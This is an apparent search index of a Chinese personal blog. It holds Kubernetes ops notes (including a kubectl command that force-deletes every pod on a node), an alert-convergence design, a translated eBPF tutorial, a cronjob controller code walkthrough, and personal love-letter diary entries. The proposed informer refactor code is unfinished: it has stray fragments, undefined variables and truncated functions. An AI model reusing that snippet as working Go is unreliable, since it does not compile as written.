[{"categories":["Code","Kubernetes"],"content":"背景 最近需要给 k8s 集群升级 docker, 预期升到 19.03.x. 遇到一些问题, 记录下 ","date":"2020-07-10","objectID":"/zh-cn/upgrade-dockerd-in-k8s/:1:0","tags":["Kubernetes","Docker"],"title":"升级 k8s 集群 docker","uri":"/zh-cn/upgrade-dockerd-in-k8s/"},{"categories":["Code","Kubernetes"],"content":"调试期间遇到的问题: 集群中的 ingress 是以 daemonsets 方式部署, 通过 node-selector 选择节点定死. 而 kubectl drain node 并不 evict daemonset pods. 故在升级/重启 dockerd 期间会造成 ingress 短暂不可用. 而现有的 lb 的 health check 不能 cover 这一点, 仍会有流量打入.会导致升级期间 ingress 流量黑洞问题. 并且 dockerd 拉起来后, 有些 daemonsets 由于 ingress 自身 livenessProbe 等原因在 dockerd 升级期间持续 crashLoopbackoff 了, 一个原因是仍然 mount 一份旧的 docker overlay. 在 delete pod 重启后恢复. 故需要一个手段在升级后重启 ingress pods. Ref https://github.com/kubernetes/kubernetes/issues/75482#issuecomment-511476698 但目前我没找到一个优雅的方式 restart all daemonsets pods on node, 只能通过脚本逐个杀 ","date":"2020-07-10","objectID":"/zh-cn/upgrade-dockerd-in-k8s/:2:0","tags":["Kubernetes","Docker"],"title":"升级 k8s 集群 docker","uri":"/zh-cn/upgrade-dockerd-in-k8s/"},{"categories":["Code","Kubernetes"],"content":"ingress qcloud lb health check 问题 由于目前我们 ingress 外部还接了 qcloud lb 做一层负载均衡, 从而引入了新问题. 遇到了没有重启 kubeproxy/calico 时网络问题(具体原因未知)导致 lb -\u003e ingress 异常, 从而导致 http 504 结论: 需要对所有 pod 进行重启最保险. 重启命令: kubectl get pods --all-namespaces -owide|awk -v host=$HOSTNAME '{if ($8 == host) system (\"kubectl -n \" $1 \" delete pods \" $2 \" --grace-period=0 \" \" --force \")}' ","date":"2020-07-10","objectID":"/zh-cn/upgrade-dockerd-in-k8s/:2:1","tags":["Kubernetes","Docker"],"title":"升级 k8s 集群 docker","uri":"/zh-cn/upgrade-dockerd-in-k8s/"},{"categories":["Code","Architecture"],"content":"背景 最近在豆瓣做面向开发者的 op 报警系统, 最头疼的是下列几种情况 脉冲型报警 单个原因引起的报警发散 多个报警为同个诱因 由于目前现有的一些告警系统都强依赖后面的监控 agent/cmdb , 比如 open-falcon/prometheus 虽然都支持了告警收敛这一套, 但要从豆瓣的 statsd+icinga 迁移到 alertManager 需要折腾一阵。而我实际只想要一个中间轻量的 alert exporter 去做告警聚合/收敛. 所以我期望实现下列 feature: 对于告警可配置梯度, 比如 apperr \u003e 50, 则立马报警不做 retry, 并且 notify_interval 为 1 分钟; 对于 50 \u003e apperr \u003e 20 则有3次 retry, retry 周期为 1 分钟, 报警周期为2分钟. 对于 apperr \u003c 1 则 retry 5 次, retry 周期 3 分钟, 报警周期 5 分钟. 告警配置中可用 与|或|非 的方式进行组合告警,告警收敛. 如 [rules] apperr - script: xxx - label: http, service, statsd, codeerr - warning_threshold: 0.5 - critical_threshold: 1.0 http500: - script: xxx - label: http, codeerr, prom prom-server-down: - script: xxx - label: prom, data-plane ... apperr | http500 表示两者其一报警了, 则 mute 另一个报警. apperr \u0026\u0026 http500 表示当两种同时发生时才告警. apperr \u0026\u0026 !http500 表示 apperr 发生但 http500 不发生时告警, 若 apperr, http500 同时发生, 则不触发该条报警规则收敛掉 apperr 报警, 只报出 http500 告警按标签聚合 对于历史数据的分析预测 ","date":"2020-07-07","objectID":"/zh-cn/alert-convergence/:1:0","tags":["Architecture","Alert"],"title":"告警收敛设计","uri":"/zh-cn/alert-convergence/"},{"categories":["Code","Architecture"],"content":"数据源 目前我们的告警数据源大致可分为 prom, statsd 以及其他(比如 mfs http api, dae-monitor-agent 抓的 cgroups 数据, shuai 数据…), 但大头基本是 prom. ","date":"2020-07-07","objectID":"/zh-cn/alert-convergence/:1:1","tags":["Architecture","Alert"],"title":"告警收敛设计","uri":"/zh-cn/alert-convergence/"},{"categories":["Code","Architecture"],"content":"告警流程 目前应该告警的流程如下: dae ossetup -\u003e bridge api 获取告警 meta data dae ossetup 将 meta data render icinga template -\u003e http 请求发给 monitor app -\u003e 刷 icinga-server 配置 icinga-server 根据配置中的 cmd 执行命令如 /usr/bin/dae-app-nagios-monitor dae-apperr $args1 $args2 ... -\u003e dae-sa-tools dae-apperr 告警 -\u003e bridge 告警元数据 api -\u003e prometheus/statsd 的 data-storage 层 bridge api 返回对应的指标, 由 dae-sa-tools 判断阈值后返回 icinga 识别的 warning/critical/unknown 等报警状态码 icinga-server 根据该状态码进行报警 而这中间是 icinaga 直接拿着 return code 进行告警控制, 故打算实现一个 alert-exporter 来做告警收敛, 预期的第三步骤流程变为 alert-exporter 按照规则定期抓取数据源指标(如 bridge api, prometheus, statsd 等)放 redis icinga 执行 cmd -\u003e alert-exporter -\u003e 按配置的收敛规则从 redis 数据进行分析是否告警 ","date":"2020-07-07","objectID":"/zh-cn/alert-convergence/:1:2","tags":["Architecture","Alert"],"title":"告警收敛设计","uri":"/zh-cn/alert-convergence/"},{"categories":["Code","Architecture"],"content":"思路 基于这篇论文《运维监控系统告警收敛的算法研究与应用》的思路, 有了以下想法 alert-export 需要记什么： 告警 name 告警 meta data(配置项) 告警 value 告警 timestamp 告警 recover time ~告警的检查周期和提醒周期应该是指数周期降频收敛的算法, 即以 2^n 递增报警周期~ 告警分组, 做相同标签收敛 对于频繁自愈的报警打标签降频 对于历史告警数据可根据组合报警预测更大范围的告警, 和预测误报 ","date":"2020-07-07","objectID":"/zh-cn/alert-convergence/:1:3","tags":["Architecture","Alert"],"title":"告警收敛设计","uri":"/zh-cn/alert-convergence/"},{"categories":["Code","Linux"],"content":"(译) eBPF Tracing 简明教程与示例 ","date":"2020-01-13","objectID":"/zh-cn/ebpf-leanring1/:1:0","tags":["Linux","eBPF"],"title":"eBPF learning 01","uri":"/zh-cn/ebpf-leanring1/"},{"categories":["Code","Linux"],"content":"背景 原文链接 http://www.brendangregg.com/blog/2019-01-01/learn-ebpf-tracing.html 原文作者 Brendan Gregg 出版时间 01 Jan 2019 翻译时间 11 Jan 2020 之前开 2019 ShangHai KubeConf 听了几场 eBPF 的分享, 最近才开始深入研究, 故打算把研究 Linux performance 的大佬 Brendan Gregg 的文章《Learn eBPF Tracing: Tutorial and Examples》 作为 eBPF 入门翻译一遍, 希望对其他非英语母语的开发者有帮助。 ","date":"2020-01-13","objectID":"/zh-cn/ebpf-leanring1/:1:1","tags":["Linux","eBPF"],"title":"eBPF learning 01","uri":"/zh-cn/ebpf-leanring1/"},{"categories":["Code","Linux"],"content":"译文 在 2019 年的 Linux Plumber’s 大会上至少有 24 场关于 eBPF 的讲座, eBPF 迅速地成为了炙手可热的技术。所以也许你也计划在新的一年里开始学习 eBPF! 如今 eBPF 在一些主流技术中都有其身影, 如虚拟内核指令集(VKIS), 由于其继承自大名鼎鼎的 Berkeley Packet Filter (BPF) , 所以它有较多的用途，如: 网络性能分析, 防火墙, 安全追踪, 设备驱动等。这些基于 eBPF 的比如一些性能追踪的产品， 在网上也不乏教程好文档。说到「追踪」，我们常认为是一些性能分析和一些提供更多观察点的工具。你可能也已经用过其中的一些工具，如 tcpdump, strace 和其他的一些 tracer 在这篇文章里我会介绍 eBPF 追踪, 并针对初学者, 稍有经验的人以及一些老手在内容上做些简单划分便于阅读。总的来说分为以下内容: 初学者: 运行 bcc 工具 稍有经验: 开发 bpftrace 工具 老手: 开发 bcc 工具, 为 bcc\u0026bpftrace 提 PR ","date":"2020-01-13","objectID":"/zh-cn/ebpf-leanring1/:1:2","tags":["Linux","eBPF"],"title":"eBPF learning 01","uri":"/zh-cn/ebpf-leanring1/"},{"categories":["Code","Linux"],"content":"初学者 1. 什么是 eBPF, bcc, bpftrace 和 iovisor? eBPF 对于 Linux 而言相当于 JavaScript 对于 HTML 的作用, 即相比于一个静态的 HTML 网站, JavaScript 能声明一些小的程序用于监听一些运行在浏览器虚拟内核上的一些用户事件如鼠标的点击等。所以有了 eBPF, 相比于一个固定的黑盒的 LInux 内核, 你也可以在用户态编写一些简单的脚本来获取一些内核事件如磁盘 I/O 等, 同样的, 这些事件也是运行在 Linux 安全内核虚拟机里。事实上呢, eBPF 比纯 JavaScript 更高级些, 它更相当于一个运行着 JavaScript 的 v8 虚拟机，且 eBPF 如今也已是 Linux 内核的一部分。 直接在 eBPF 中编写代码是非常难得, 就像你要直接写些 v8 虚拟机二进制代码一样。实际上也没啥人直接写 v8 代码, 大家都是直接写更友好的 JavaScript 或者一个基于 JavaScript 的上层框架(jQuery, Angular, React 等)。 这件事在 eBPF 也一样, 人们不会直接写内核代码, 而是通过 eBPF 框架编写一些上层代码。拿性能追踪来说，主要用的是 bcc 和 bpftrace 。这两个工具并不在 内核代码中, 它们独立于 GitHub 上另一个 Linux 基金会的项目叫 iovisor 2. eBPF 性能追踪的简单例子 先介绍一个基于 eBPF 的工具, tcplife tcplife 可以展示出完整生命周期的 TCP sessions, 并且可以看到进程 id (PID), 进程命令名 (COMM), 发送和接受的字节数以及 TCP 连接的持续时间 (单位是 ms), 如图: 需要注意的是 eBPF 并没有开放给用户可以通过旧的内核技术来重写 TCP 生命周期的入口，不过假如哪天开放了, 这样的入口也会带来一些性能上的额外开销,一些内核安全问题等等,所以我们永远不会使用这样的工具。eBPF 给工具带来的特性应该是可实践的, 便捷的，安全的。拿 tcplife 举个例子, 它并不会追踪每一个包, 这样会带来很多额外的开销，相反的，eBPF 只会追踪 TCP 生命周期的事件, 这些时间并不会这么频繁, 从而给系统带来的开销会低得多, 我们也可以从容地让这个工具 7x24 小时地在生产环境运行。 3. 怎么使用 eBPF 呢? 对于新手来说, 可以说是从 bcc 开始使用, 具体教程可以参照这篇文章 在 Ubuntu 系统上, 可以简单地这么安装 我呢是通过运行 opensnoop 来测试 bcc 是否 work 的, 所以如果你也这么搞过, 那么恭喜你, 你也用过 eBPF 啦！ 如今一些公司如 Netflix 和 Facebook 已经默认在所有服务器上安装了 bcc 所以也许你也可以开始这么搞。 4. 新手教程 如果你想直接学习 bcc 那么也可以看看这篇教程, 这是一个对于新手来学习 eBPF 性能追踪极好的出发点。 作为新手呢, 你不需要一开始就写些 eBPF 代码。bcc 有接近 70 多个衍生工具你都可以直接使用。这篇教程也会带你逐步过一遍以下 11 个趴(part): execsnoop opensnoop ext4slower (or btrfs*, xfs*, zfs*) biolatency biosnoop cachestat tcpconnect tcpaccept tcpretrans runqlat profile 一旦上述内容你都尝试过后, 你可能就会有了一个全局性的概念: 网上已经有过很多较为完整的 man pages 和示例来介绍这十一个趴(part)了。在官方 repo (bcc/tools) 中的示例文件 *_example.txt 展示了上述概念的具体释义，比如 biolatency_example.txt. 中你可以了解到如何用 bcc 来追踪 block I/O 时延, repo 中也有很多我写的示例文件, man pages 和具体工具，满打满算估摸着有 50 多篇 blog 了吧 不过目前还欠缺的是在生产环境中的一些示例。因为这些 blog 绝大多数是我在 eBPF 刚诞生不久，我们并没在生产环境中运行而只在测试实例上跑，所以大部分示例都是在一定场景下构造的。不久后也许我们会再新加些生产环境的示例，而这部分也需要大家的帮助，比如当你使用一个 eBPF 工具解决了某些生产环境问题时, 可以考虑留些现场和截图，并且提些 PR 加到示例文件中。 ###稍有经验 这一章节的假设读者应该都已经使用过 bcc 及其他各种相关工具了, 如果你对二次开发 eBPF 工具感兴趣的话, 那么最佳的入手点就在于先尝试从 bcc 切换到 bpftrace , 这是一个更高级更易入门的语言。但 bpftrace 也有不足之处, 它不像 bcc 那样支持自定化, 所以大概率你可能最终使用完仍然会切换回 bcc 想要深入了解 bpftrace 的话可以参考这篇文章 , 这是一个相对较新的项目, 所以在我写这篇文章时可能这个工具并没有被成熟的引入各个 Linux 包管理系统，不过在未来，应该可能通过类似 apt-get install bpftrace 或类似的方式来安装, 目前只能通过编译源码包安装。 1. bpftrace 教程 我也写了另一个教程会教你如何通过单行命令玩转 bpftrace bpftrace One-Liners Tutorial 这个教程分为 12 章节来逐步叫你学习 bpftrace ， 一个简单示例如下: 这句命令会找出所有打开系统调用追踪点的 PID 和文件路径 2. bpftrace 参考指南 想了解更多有关 bpftrace 的话，可以参考我的这篇文章 bpftrace Reference Guide 你可以从中了解到有关 bpftrace 语法，探针和一些内置组件。 3. bpftrace 示例 bpftrace repo 中有近 20 个工具，你可以简单参考 bpftrace Tools 比如其中用于追踪 block I/O 时延的脚本 如同 bcc, 这些工具也有详尽的 man pages 和示例, 比如 biolatency_example.txt ","date":"2020-01-13","objectID":"/zh-cn/ebpf-leanring1/:1:3","tags":["Linux","eBPF"],"title":"eBPF learning 01","uri":"/zh-cn/ebpf-leanring1/"},{"categories":["Code","Linux"],"content":"老鸟 1. 开发 bcc 这儿是我整理的一些关于开发及二次开发 bcc 的相关文档: bcc Python Developer Tutorial bcc Reference Guide 在 bcc/tools/ 目录下有很多 *.py 文件可供学习, 这些 py 文件大约可以分成两部分: BPF 内核 C 代码的 Python 实现(或 lua, C++ 实现) Python 的一些 BPF 用户态工具 开发 bcc 工具确实是需要成熟的技术的，因为这可能会涉及到一些细碎的内核问题或应用底层问题 2. 提贡献 我们非常欢迎以下贡献 提交 bcc issues 提交 bpftrace issues 对于 bpftrace, 有个 bpftrace Internals Development Guide 教程, 如果你正在写些 llvm IR 的代码, 那么这部分的开发对你是个挺大的挑战…… 当然, 提贡献这部分也可以涉及内核 eBPF (aka BPF) 的引擎。 如果你浏览过 bcc 和 bpftrace 的 issues 的话, 你会看到很多优化相关的请求，诸如 bpftrace kernel tag 等等。此外，持续关注 netdev 邮件列表来料及到最新的内核 BPF 开发也是需要做的，这部分通常有些会在下一个 release 中 merge 到 Linux 主分支上。 此外，除了编写代码，你也可以写些测试，包构建，博客或者演讲分享来帮助我们。 ","date":"2020-01-13","objectID":"/zh-cn/ebpf-leanring1/:1:4","tags":["Linux","eBPF"],"title":"eBPF learning 01","uri":"/zh-cn/ebpf-leanring1/"},{"categories":["Code","Linux"],"content":"总结 eBPF 确实做了很多事情。在这篇文章里我只是简单介绍了如何学习 eBPF 性能分析和追踪，总的来说是以下内容 初学者: 把 bcc 工具跑起来 稍有经验: 开发 bpftrace 工具 老鸟: 开发 bcc 工具, 对 bcc \u0026 bpftrace 做贡献 同时在这个页面 eBPF Tracing Tools 有这篇文章更详细的内容, 其中涉及细节较多, 感兴趣的话可以仔细阅读。 祝你好运！ ","date":"2020-01-13","objectID":"/zh-cn/ebpf-leanring1/:1:5","tags":["Linux","eBPF"],"title":"eBPF learning 01","uri":"/zh-cn/ebpf-leanring1/"},{"categories":["Gossip"],"content":"这些日子隐隐觉得你并不开心, 我十分自责, 总觉得是那天妖精们藏起了星星。 北京的天总是阴沉沉的，有时候好像是要开启一场庭审，让我紧张得四肢发麻，不知道你会不会也因此闷闷不乐。这样的日子，可真叫人腻味，我沮丧得想睡觉。唯独那天看着你把脸藏在被子里沉沉地入睡，我欢喜得不行，这一天何其矜贵，希望你做个好梦。 所以我特别期望能有个间隙去看看被藏起来的东西，看星星也是我生活中为数不多的理想主义。 那时你说我喋喋不休，要知道我是个时刻沸腾的人，能滋滋作响一整天，总有一些莫名其妙的巨大能量，但我也要悄悄地藏起来，可要把我所有的能量分成一天天的给你。这样我就能沉静许多，不过其实一见到你，那些跳脱的念头总能平静下来。 就像一只海豚，终于跳进了阿芙罗狄忒的海湾，有海鸥有落日，不免沉浸其中。 这样的日子，我也想藏起来，担心有一天我不会记得，只期望有那么几个瞬间，偶然念及你的名字，心底像冒出海葵与青荇，世界变量明亮开朗起来。 所以，我还想看着你笑，看着你看电影时甜甜地睡着，你说，我哪能让你一个人生闷气呢。 你说未来会有多少无生趣的毫不起眼的夜晚，我就跋涉到灯塔上，威胁妖精们把藏起来的光，投射下来。 加油啊，阿芙罗狄忒。 ","date":"2020-01-09","objectID":"/zh-cn/dont-cry-aphrodite/:0:0","tags":["Gossip"],"title":"阿芙罗狄忒你不要哭泣","uri":"/zh-cn/dont-cry-aphrodite/"},{"categories":["Code","Kubernetes"],"content":"背景 之前一段时间正好接触到 kubernetes cronjob, 在接入时遇上了在一定量级下 cronjob schedule delay 的问题, 故开始读了下代码, 发现了一些问题并试着调优了下 ","date":"2019-12-14","objectID":"/zh-cn/talk-about-k8s-cronjob/:0:1","tags":["Golang","Kubernetes","Linux"],"title":"Talk about Kubernetes cronJob controller","uri":"/zh-cn/talk-about-k8s-cronjob/"},{"categories":["Code","Kubernetes"],"content":"存在的问题 按生产环境实际测试来看约 250-375 个 */1 * * * * 每分钟 interval 的 cronjob 就会产生 delay, cronjob 和 controller manager 没有异常 event 但新产生的 job 出现了延迟, 由于我们设置了 startingDeadlineSeconds 故累加起来的 delay 最终导致了 cron 任务严重滞后 ","date":"2019-12-14","objectID":"/zh-cn/talk-about-k8s-cronjob/:0:2","tags":["Golang","Kubernetes","Linux"],"title":"Talk about Kubernetes cronJob controller","uri":"/zh-cn/talk-about-k8s-cronjob/"},{"categories":["Code","Kubernetes"],"content":"代码解读 出于分析上述问题的目的, 读了下 cronjob controller 的代码, 代码量不多, 可能由于没上 GA 的原因, 整个 controllor 代码的设计也比较过程式, 不会像其他组件用到一些比如 Informer, refractor之类的组件读起来相对晦涩 下面开始解读下 release1.17 分支的 k8s cronjob controller 代码 Controller struct type Controller struct { kubeClient clientset.Interface jobControl jobControlInterface sjControl sjControlInterface podControl podControlInterface recorder record.EventRecorder } cronjob controller 结构体, 即下文中常见的 jm(jobManager) , 主要包了 k8s internal api clinet kubeclinet, jobControl 和 sjControl k8s job 控制块，cronjob controller 会直接操作 job, 由 job 再去创建 pod, 并不会直接接触到 pod 对象(包括读) 入口函数 Run: // Run starts the main goroutine responsible for watching and syncing jobs. func (jm *Controller) Run(stopCh \u003c-chan struct{}) { defer utilruntime.HandleCrash() klog.Infof(\"Starting CronJob Manager\") // Check things every 10 second. go wait.Until(jm.syncAll, 10*time.Second, stopCh) \u003c-stopCh klog.Infof(\"Shutting down CronJob Manager\") } cronjob controller 是个单线程单执行流的调度器, 由固定每 10s 的 interval 的 goroutine 做一次 syncAll 调用 主 loop 函数 syncAll // syncAll lists all the CronJobs and Jobs and reconciles them. func (jm *Controller) syncAll() { // List children (Jobs) before parents (CronJob). // This guarantees that if we see any Job that got orphaned by the GC orphan finalizer, // we must also see that the parent CronJob has non-nil DeletionTimestamp (see #42639). // Note that this only works because we are NOT using any caches here. jobListFunc := func(opts metav1.ListOptions) (runtime.Object, error) { return jm.kubeClient.BatchV1().Jobs(metav1.NamespaceAll).List(opts) } js := make([]batchv1.Job, 0) err := pager.New(pager.SimplePageFunc(jobListFunc)).EachListItem(context.Background(), metav1.ListOptions{}, func(object runtime.Object) error { jobTmp, ok := object.(*batchv1.Job) if !ok { return fmt.Errorf(\"expected type *batchv1.Job, got type %T\", jobTmp) } js = append(js, *jobTmp) return nil }) if err != nil { utilruntime.HandleError(fmt.Errorf(\"Failed to extract job list: %v\", err)) return } klog.V(4).Infof(\"Found %d jobs\", len(js)) cronJobListFunc := func(opts metav1.ListOptions) (runtime.Object, error) { return jm.kubeClient.BatchV1beta1().CronJobs(metav1.NamespaceAll).List(opts) } jobsBySj := groupJobsByParent(js) klog.V(4).Infof(\"Found %d groups\", len(jobsBySj)) err = pager.New(pager.SimplePageFunc(cronJobListFunc)).EachListItem(context.Background(), metav1.ListOptions{}, func(object runtime.Object) error { sj, ok := object.(*batchv1beta1.CronJob) if !ok { return fmt.Errorf(\"expected type *batchv1beta1.CronJob, got type %T\", sj) } syncOne(sj, jobsBySj[sj.UID], time.Now(), jm.jobControl, jm.sjControl, jm.recorder) cleanupFinishedJobs(sj, jobsBySj[sj.UID], jm.jobControl, jm.sjControl, jm.recorder) return nil }) if err != nil { utilruntime.HandleError(fmt.Errorf(\"Failed to extract cronJobs list: %v\", err)) return } } 首先 pager.New(pager.SimplePageFunc(jobListFunc))通过 Pager 调用了 jobListFunc 回调函数, 用于 list 出所有 namespace 下的 k8s job 对象, 并将这些 jobs 加入 slice 中, 这个 slices js := make([]batchv1.Job, 0) 用于在之后对 sync 单个 cronJob 时作为是否已经 trigger job 的判断 同理 pager.New(pager.SimplePageFunc(cronJobListFunc)).EachListItem list 所有 cronjob 对象并对每个对象调用 syncOne 做实际 cronjob 调度, 在调度完后调用 cleanupFinishedJobs 完成清理工作 ​ - 对于成功执行的 job 根据 HistoryLimit 进行 apiserver 中的资源清理 ​ - 对于执行失败的 job 按 limitBackoff 的限制进行重试 - 若处于非上述两种状态的 job 则忽略 主调度函数 syncOne func syncOne(sj *batchv1beta1.CronJob, js []batchv1.Job, now time.Time, jc jobControlInterface, sjc sjControlInterface, recorder record.EventRecorder) { nameForLog := fmt.Sprintf(\"%s/%s\", sj.Namespace, sj.Name) // 首先在之前的 batchv1.Job slice 中顺序查找是否有当前 cronJob 的子 job 并且看看是否有不在 jobActive 列表中的孤儿，以及已经执行完成但是还在 Active 列表中的 job，根据 job 状态记录 event (UnexpectedJob, SawCompletedJob)，删掉不对应的状态 childrenJobs := make(map[types.UID]bool) for _, j := range js { childrenJobs[j.ObjectMeta.UID] = true found := inActiveList(*sj, j.ObjectMeta.UID) if !found \u0026\u0026 !IsJobFinished(\u0026j) { recorder.Eventf(sj, v1.EventTypeWarning, \"UnexpectedJob\", \"Saw a job that the controller did not create","date":"2019-12-14","objectID":"/zh-cn/talk-about-k8s-cronjob/:0:3","tags":["Golang","Kubernetes","Linux"],"title":"Talk about Kubernetes cronJob controller","uri":"/zh-cn/talk-about-k8s-cronjob/"},{"categories":["Code","Kubernetes"],"content":"调优 首先对于 pager.List 尝试替换成 informer watch 的机制, 思路也比较简单, 原先是通过 pager.List 传入的回调来获取 namespace 下所有的 job/cronjob, 现在改为在新建 controller 时注册进 watch event, 监听到变更事件时通过 k8s 封装好的 internal.api.sharedInformer 取回并构造成相同 struct 的对象即可 先看一段原本 pager.List 的代码: cronJobListFunc := func(opts metav1.ListOptions) (runtime.Object, error) { return jm.kubeClient.BatchV1beta1().CronJobs(metav1.NamespaceAll).List(opts) } err = pager.New(pager.SimplePageFunc(cronJobListFunc)).EachListItem(context.Background(), metav1.ListOptions{}, func(object runtime.Object) error { ... } 接着按上述方式在 controller 中先注册 event: type Controller struct { kubeClient clientset.Interface jobControl jobControlInterface sjControl sjControlInterface podControl podControlInterface recorder record.EventRecorder // Codes after refractor queue workqueue.RateLimitingInterface cronjobSynced cache.InformerSynced syncHandler func(key string) error cronjobLister batchv1beta1Lister.CronJobLister } // 接着注册 Informer 并声明 CronJobListener 对应的 callback(add/update/delete) func NewCronJobController(kubeClient clientset.Interface) (*CronJobController, error) { jm, err := NewController(kubeClient) if err != nil { return nil, err } queue: workqueue.NewNamedRateLimitingQueue(workqueue.DefaultControllerRateLimiter(), \"cronjob\"), } cronjobInformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs{ }) return jm, nil } k8s informer 的机制需要有 event trigger 来判断在什么事件下触发, 故我们可以简单先加上增删改时的 trigger 故上述代码修改为 func (jm *CronJobController) addCronjob(obj interface{}) { d := obj.(*batchv1beta1.CronJob) glog.V(4).Infof(\"Adding CronJob %s\", d.Name) jm.enqueue(d) } func (jm *CronJobController) updateCronjob(old, cur interface{}) { oldC := old.(*batchv1beta1.CronJob) curC := cur.(*batchv1beta1.CronJob) glog.V(4).Infof(\"Updating CronJob %s\", oldC.Name) jm.enqueue(curC) } func (jm *CronJobController) deleteCronjob(obj interface{}) { d, ok := obj.(*batchv1beta1.CronJob) if !ok { tombstone, ok := obj.(cache.DeletedFinalStateUnknown) if !ok { utilruntime.HandleError(fmt.Errorf(\"couldn't get object from tombstone %#v\", obj)) return } d, ok = tombstone.Obj.(*batchv1beta1.CronJob) if !ok { utilruntime.HandleError(fmt.Errorf(\"tombstone contained object that is not a CronJob %#v\", obj)) return } } glog.V(4).Infof(\"Deleting CronJob %s\", d.Name) jm.enqueue(d) } // 接着注册 Informer 并声明 CronJobListener 对应的 callback(add/update/delete) func NewCronJobController(kubeClient clientset.Interface) (*CronJobController, error) { jm, err := NewController(kubeClient) if err != nil { return nil, err } queue: workqueue.NewNamedRateLimitingQueue(workqueue.DefaultControllerRateLimiter(), \"cronjob\"), } // event trigger cronjobInformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs{ AddFunc: jm.addCronjob, UpdateFunc: jm.updateCronjob, DeleteFunc: jm.deleteCronjob, }) // 有了 event trigger 后需要处理当事件触发获取到 cronjob 时该做什么操作 // 按之前的逻辑来看应该对每个 cronjob 调用 syncOne jm.cronjobLister = cronjobInformer.Lister() jm.cronjobSynced = cronjobInformer.Informer().HasSynced jm.syncHandler = jm.syncOne return jm, nil } 接着上述代码只是声明了一堆需要注册的 event trigger(增删改 cronjob 时将cronjob对象放入 workQueue) 和 event handler(syncOne) 但 syncAll 主函数仍然做着原先的工作, 所以我期望的是在主函数中阻塞的获取 workQueue 中的 job, 并按 FIFO 的方式 process 每个 job (暂时没必要对于每个 job 起 goroutine syncOne, 会增加复杂性, 本身的处理能力猜测是足够的) 故将 syncAll 主函数代码改为 // 提供 enqueue 函数用于将 batchv1beta1.CronJob 入队 func (jm *CronJobController) enqueue(cronjob *batchv1beta1.CronJob) { key, _ := controller.KeyFunc(cronjob) sjs := sjl.Items glog.V(4).Infof(\"Found %d cronjobs\", len(sjs)) jobsBySj := groupJobsByParent(js) jm.queue.Add(key) } // 提供一个从 informer 中获取对象的 key 并 enqueue 到 worker queue 的函数 func (jm *CronJobController) EnqueueCronjob() { cjobs, err := jm.cronjobLister.List(labels.Everything()) if err != nil { fmt.Errorf(\"Could not list all cronjobs %v\", err) return } for _, job := range cjobs { jm.enqueue(job) } } // 在 syncAll 主函数中起 goroutine 开始 watch cronjob, 一旦拿到 job 则调用注册的 syncOne 函数 func (jm *CronJobController) syncAll() { ... go wait.Until(func() { EnqueueCronjob","date":"2019-12-14","objectID":"/zh-cn/talk-about-k8s-cronjob/:0:4","tags":["Golang","Kubernetes","Linux"],"title":"Talk about Kubernetes cronJob controller","uri":"/zh-cn/talk-about-k8s-cronjob/"},{"categories":["Gossip"],"content":"你像个琢磨不透的妖精。 前一天晚上我们一起打游戏到深夜，今天我却变成了冷漠的『这一位』 这么说，你是不是没那么喜欢我。 每每至此，我就又开始瞎想些我们分离的日子。 我知道多疑是深植在我们的根性里，我对你却如此猜忌，我真是个坏家伙。 昨天看书抄了一句话 「对于见面我看得较重，对于分别我看得较轻，这是人生取巧之一法，否则聚少离多，悲哀多于欢乐，一生只好负着无尽痛苦的债了。」 我却把别离看得很重，有时甚至有些宿命的情调，会觉得终有一天我们会分别，我害怕那天的到来。却又觉得这样揪着伫念的心，想必很会让你担心吧。所以总试着做些改变，我想着只要我们真正相爱，哪怕一天，一小时，那我可千万不能把我的苦难流露给你，我想看着你笑，特别想。 今晚回家路上，见着一位小孩在卖盐水菠萝，周围散着飞蝇，狗叫和蝉鸣热闹得扎耳。可是都与你无关，顿时对菠萝失去的兴趣。 到家时甚是沮丧，像是被一种抑郁缠绕其中，唯独想着你，写起日记来，才感觉所有的温情开始流到笔端。 你说，今夜何时我才能听见你的声音。 今天我和室友们说，我已经很久没有做梦了，像是被盗梦人收割走了灵光。 我骗了他们，昨夜我又梦到了你，梦见我变成了聊斋志异里的促织，趴在你臂上，挠得你痒痒的。 我不太愿意去想这意味着什么，醒来时只觉得心理暖洋洋的，这股暖流正逐渐透过我的细胞壁溢到空气里，我多想与你分享这间空气。 希望你不要介意，那我一定说个不停。 ","date":"2019-08-05","objectID":"/zh-cn/you-are-my-sunshine/:0:0","tags":["Gossip"],"title":"你就是我的灵光","uri":"/zh-cn/you-are-my-sunshine/"},{"categories":["Gossip"],"content":"真想听一听见你的声音啊。 今晚倘若再不能见着你，我准睡不着。 已经三个夜晚你没有理我了，你是不是故意躲着我。 今天是星期五，我一点都开心不起来，一想到不能像前几个周末一样宅在小屋子里看《乐队的夏天》，我的灵魂就像被汲取干了一般。 我渴望见着你，我们打一架，把心里的不痛快都说出来，好不好。 我又渴望抱抱你，这几天你是开心还是伤心呢，我全然不知。 这几天下来，我逐渐开始认清自己，我实在是个坏人，你不要为我不安。 啊你突然回来了，心跳好快，我不想写了，我有好多好多话跟你说，我看着你的眼睛，啥都说不出来，我想把你的美写下来，写不出，我想写诗，写雨，但满脑子想的都是你。 ","date":"2019-08-02","objectID":"/zh-cn/badly-wanted/:0:0","tags":["Gossip"],"title":"请你不要吃掉我","uri":"/zh-cn/badly-wanted/"},{"categories":["Gossip"],"content":"前天，我们吵架了，但主要是我一人暗暗生闷气。 在此之前，我总认为自己已经是不依附于任何情感的，也鲜有真正让我生气的事儿。 没想到在不经意间听到你提起那只臭猪的名字，忍不住暴跳如雷。 我是惶恐的，极其自私的，真的。 也许是我自己卑鄙无耻的胡猜，但一想到有一天会瞥见你清澈的晶状体房水里倒映的是别人的身影，我就懊恼。 这些天你不怎么想理我，我能听到办公室的时针滴答滴答的毫无意义的钟摆。我把标记过的好多小说和电影都跳着翻了翻，却总是静不下心。我一度以为即便不再那么鲜活地见到你，我也能很平静地走过去，能逃遁到更远的地方去。 王小波说的是对的，人是轻易不能知道自己的。 人可以对别人有最细微的感觉，但对自己就迟钝得多。 后知后觉地反应过来，耍的这些小脾气真的会让你担心。我以为自己会很得意，会觉得自己是被需要的，但才发现自己多么丑陋。我不愿意让你再焦心了。我喜欢看你笑，笑起来皱着鼻子，团成一只小饭团。可是我这么稀里糊涂地，又让你伤心了。 我真是无可救药的大笨蛋，你说我这个人还有值得原谅的地方吗。 我好难过，感觉自己有个什么决断做不出来，生闷气的那天晚上，我走到了很远的地方，看了很久的天空，夜晚的光收敛进漫天的星云中，我多希望里面会泄出金光，那我一定把你叫出来，想那些金萤的东西包裹住我们。 